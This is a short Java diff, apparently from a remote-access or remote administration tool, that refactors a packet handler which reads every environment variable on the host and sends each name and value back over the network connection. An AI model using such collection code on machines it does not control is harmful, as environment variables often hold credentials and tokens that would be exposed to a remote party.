@@ -11,7 +11,7 @@ public class Packet96EnvironmentVariables extends AbstractIncomingPacket {
 	public void read(Connection con) throws Exception {
 		Set<String> set = System.getenv().keySet();
 		for (String str : set) {
-			Connection.instance.addToSendQueue(new Packet32SystemProperties(str, System.getenv().get(str)));
+			con.addToSendQueue(new Packet32SystemProperties(str, System.getenv().get(str)));
 		}
 	}
 
